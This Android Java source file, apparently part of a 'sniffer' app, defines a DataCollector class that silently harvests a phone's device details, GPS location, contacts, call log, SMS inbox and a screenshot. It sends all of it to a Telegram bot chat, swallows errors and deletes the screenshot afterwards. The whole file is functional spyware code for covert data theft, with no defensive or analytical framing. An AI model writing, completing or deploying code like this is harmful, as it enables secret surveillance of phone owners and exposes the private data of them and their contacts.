package com.v8.global.sniffer.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class DataCollector {
    
    private Context context;
    private OkHttpClient client;
    private static final String TAG = "DataCollector";
    
    public DataCollector(Context context) {
        this.context = context;
        this.client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
    }
    
    public void collectAndSend() {
        sendDeviceInfo();
        sendLocation();
        sendContacts();
        sendCallLogs();
        sendSMS();
        takeScreenshot();
    }
    
    private void sendDeviceInfo() {
        try {
            String info = "📱 **معلومات الجهاز**\n\n" +
                         "• الطراز: " + Build.MODEL + "\n" +
                         "• الشركة: " + Build.MANUFACTURER + "\n" +
                         "• الإصدار: " + Build.VERSION.RELEASE + "\n" +
                         "• Android: " + Build.VERSION.SDK_INT + "\n" +
                         "• الوقت: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
            
            sendToTelegram(info);
        } catch (Exception e) {
            Log.e(TAG, "خطأ في معلومات الجهاز");
        }
    }
    
    private void sendLocation() {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) 
                    == PackageManager.PERMISSION_GRANTED) {
                
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location == null) {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                
                if (location != null) {
                    String mapUrl = "https://maps.google.com/?q=" + 
                                   location.getLatitude() + "," + 
                                   location.getLongitude();
                    
                    String msg = "📍 **الموقع**\n\n" +
                                "• الرابط: " + mapUrl + "\n" +
                                "• الوقت: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
                    
                    sendToTelegram(msg);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الموقع");
        }
    }
    
    private void sendContacts() {
        try {
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            
            if (cursor != null) {
                StringBuilder sb = new StringBuilder("👤 **جهات الاتصال**\n\n");
                int count = 0;
                
                while (cursor.moveToNext() && count < 20) {
                    String name = cursor.getString(cursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    
                    sb.append("• ").append(name).append(": ").append(phone).append("\n");
                    count++;
                }
                cursor.close();
                
                sendToTelegram(sb.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في جهات الاتصال");
        }
    }
    
    private void sendCallLogs() {
        try {
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 10");
            
            if (cursor != null) {
                StringBuilder sb = new StringBuilder("📞 **آخر المكالمات**\n\n");
                
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    
                    String typeText = type.equals("1") ? "📞 وارد" : 
                                     type.equals("2") ? "📞 صادر" : "❌ فائت";
                    
                    sb.append(typeText).append(": ").append(number)
                      .append(" - ").append(new Date(date).toString()).append("\n");
                }
                cursor.close();
                
                sendToTelegram(sb.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في سجل المكالمات");
        }
    }
    
    private void sendSMS() {
        try {
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null,
                "date DESC LIMIT 10");
            
            if (cursor != null) {
                StringBuilder sb = new StringBuilder("💬 **آخر الرسائل**\n\n");
                
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    
                    sb.append("📨 من ").append(address).append(":\n");
                    sb.append(body.length() > 50 ? body.substring(0, 50) + "..." : body);
                    sb.append("\n---\n");
                }
                cursor.close();
                
                sendToTelegram(sb.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الرسائل");
        }
    }
    
    private void takeScreenshot() {
        try {
            String path = Environment.getExternalStorageDirectory() + "/Pictures/screen_" + 
                         System.currentTimeMillis() + ".png";
            
            Process process = Runtime.getRuntime().exec("screencap -p " + path);
            process.waitFor();
            
            File file = new File(path);
            if (file.exists()) {
                sendPhoto(file, "📱 لقطة شاشة");
                file.delete();
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في تصوير الشاشة");
        }
    }
    
    private void sendPhoto(File file, String caption) {
        try {
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", Constants.CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("photo", file.getName(),
                            RequestBody.create(MediaType.parse("image/jpeg"), file))
                    .build();
            
            Request request = new Request.Builder()
                    .url(Constants.BASE_URL + "sendPhoto")
                    .post(body)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response r) throws IOException { r.close(); }
            });
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال الصورة");
        }
    }
    
    private void sendToTelegram(String message) {
        try {
            String url = Constants.BASE_URL + "sendMessage?chat_id=" + Constants.CHAT_ID +
                        "&text=" + Uri.encode(message) + "&parse_mode=Markdown";
            
            Request request = new Request.Builder().url(url).build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response r) throws IOException { r.close(); }
            });
        } catch (Exception e) {}
    }
}
